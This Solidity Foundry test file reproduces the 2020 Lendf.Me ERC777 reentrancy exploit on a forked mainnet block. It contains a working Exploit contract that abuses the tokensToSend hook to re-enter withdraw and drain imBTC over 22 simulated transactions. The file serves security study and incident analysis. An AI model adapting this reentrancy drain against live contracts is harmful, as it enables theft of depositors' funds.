// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// @KeyInfo
// Total Lost : ~25m USD
//   - 55159.02134460335 WETH
//   - 7,180,525.081566 USDT
//   - 320.277137217713969563 HBTC
//   - 291.34731812 imBTC
//   - 698,916.403476 USDT
//   - 587,014.603672792914251907 USDP
//   - 510,868.160665305222372335 USDX
//   - 480,787.8876691284 BUSD
//   - 458,794.387633044899617465 TUSD
//   - 432,162.90568675 HUSD
//   - 77,930.9343329832  CHAI
//   - 9.01152278 WBTC
// Vulnerability Type : ERC777 Reentrancy
// Attacked At : Mainnet, block height 9899736, 2020-04-19T0:58:43Z
// Attacker : 0xA9BF70A420d364e923C74448D9D817d3F2A77822
// Exploit Contract : 0x538359785a8D5AB1A741A0bA94f26a800759D91D
// Revenue Address : 0xA9BF70A420d364e923C74448D9D817d3F2A77822
// Victim Contract : 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea (Lendf.Me)
// Vulnerable Snippet :
//   - https://etherscan.io/address/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea#code#L1508
//   - https://etherscan.io/address/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea#code#L1634
//
// Attack Txs :
//   - Check https://etherscan.io/address/0x538359785a8d5ab1a741a0ba94f26a800759d91d for more details
//
// @Info
// Auxiliary Contracts : 
//   - 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24 (ERC1820 Registry Contract)
//   - 0x3212b29E33587A00FB1C83346f5dBFA69A458923 (imBTC Token Contract)
//
// @Ref
// PeckShield : https://peckshield.medium.com/uniswap-lendf-me-hacks-root-cause-and-loss-analysis-50f3263dcc09


contract Attakcer is Test {
    
    IMBTC private constant imBTC = IMBTC(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    IMoneyMarket private constant lendfMe = IMoneyMarket(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea);
    address private constant originExploitContractAddr = 0x538359785a8D5AB1A741A0bA94f26a800759D91D;
    Exploit exploit;

    function setUp() public {
        vm.createSelectFork("mainnet", 9_899_735);
        exploit = new Exploit();

        // --------------------------------------------------------------------------------------------------------
        // In the original attack, after creating the exploit contract, the attacker funded 0.00021595 imBTC to the exploit contract.
        // Funding Tx : https://etherscan.io/tx/0x88fa4e8609baac44189a58faf7cb740cf35308957832ffd6656999229fea689f
        // Since imBTC's `balanceOf()` function is a customized implementation, we cannot simply fund the `Exploit` contract through `deal()` function.
        // Also, because the UniswapV1 attack has occurred in the previous blocks, we couldn't buy imBTC through the UniV1 ETH/imBTC Exchange contract either.
        // Therefore, the approach we take here is to overwrite the `Exploit` contract code into the origin exploit contract address.
        vm.etch(originExploitContractAddr, address(exploit).code);
        exploit = Exploit(originExploitContractAddr);
        // --------------------------------------------------------------------------------------------------------
    }

    /*
     * @dev In this PoC, we only reproduced how attacker steal-out Lendf.Me's imBTC balance.
     * @dev The others ERC20 tokens are not included in this PoC.
     */
    function testExploit() public {
        console.log("[Before Attack] imBTC.balanceOf(address(this)) = %8e", imBTC.balanceOf(address(this)));
        console.log("------------------------------------------------------------------------------------------");
        // The attacker initiated 77 attack txs, but only 22 of them were true positive attack txs.
        // It's worth noting that each true positive attack txs has been confirmed at a different block height.
        // Here we simply use `roll(block.number + 1)` to reproduce each true positive attack txs.
        for(uint i; i < 22; ++i) {
            vm.roll(vm.getBlockNumber() + 1);

            console.log("[Before Attack %d] imBTC.balanceOf(EXPLOIT_CONTRACT) = %8e", i, imBTC.balanceOf(address(exploit)));
            console.log("[Before Attack %d] imBTC.balanceOf(Lenf.Me) = %8e", i, imBTC.balanceOf(address(lendfMe)));
        
            exploit.a();

            console.log("[After Attack %d] imBTC.balanceOf(EXPLOIT_CONTRACT) = %8e", i, imBTC.balanceOf(address(exploit)));
            console.log("[After Attack %d] imBTC.balanceOf(Lendf.Me) = %8e", i, imBTC.balanceOf(address(lendfMe)));
        }

        address[] memory withdrawTokens = new address[](1);
        withdrawTokens[0] = address(imBTC);
        exploit.w(withdrawTokens);

        console.log("------------------------------------------------------------------------------------------");
        console.log("[After Attack] imBTC.balanceOf(address(this)) = %8e", imBTC.balanceOf(address(this)));
    }

    receive() external payable {}
}


contract Exploit {
    IERC1820Registry private constant erc1820Registery = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    IMBTC private constant imBTC = IMBTC(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    IMoneyMarket private constant lendfMe = IMoneyMarket(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea);

    function a() public {
        imBTC.approve(address(lendfMe), type(uint256).max);
        erc1820Registery.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
        lendfMe.supply(address(imBTC), imBTC.balanceOf(address(this))-1);
        lendfMe.supply(address(imBTC), 1);
    }

    function b(address account) public {
        uint256 balance = IERC20(account).balanceOf(address(lendfMe));
        if (balance > 1) {
            lendfMe.borrow(account, balance-1);
        }
    } 

    function w(address[] calldata tokens) public {
        for (uint256 i; i < tokens.length; ++i) {
            uint256 balance = IERC20(tokens[i]).balanceOf(address(this));
            IERC20(tokens[i]).transfer(msg.sender, balance);
        }
    }

    function tokensToSend(address, address, address, uint256 amount, bytes calldata, bytes calldata) external {
        if (amount == 1) {
            uint256 supplyBalance = lendfMe.getSupplyBalance(address(this), address(imBTC));
            uint256 imBTCBalance = imBTC.balanceOf(address(lendfMe));
            if (supplyBalance <= imBTCBalance) {
                lendfMe.withdraw(address(imBTC), supplyBalance);
            } else {
                lendfMe.withdraw(address(imBTC), imBTCBalance);
            }
        }
    }
}

// ------------------------------------------------------------------
//                              INTERFACES
// ------------------------------------------------------------------
// Shortened interface, removed unused methods.
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IMoneyMarket {
    function borrow(address asset, uint256 amount) external returns (uint256);
    function getSupplyBalance(address account, address asset) external view returns (uint256);
    function supply(address asset, uint256 amount) external returns (uint256);
    function withdraw(address asset, uint256 requestedAmount) external returns (uint256);
}


interface IMBTC {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function exchangeRate() external view returns (uint256);

}

interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}
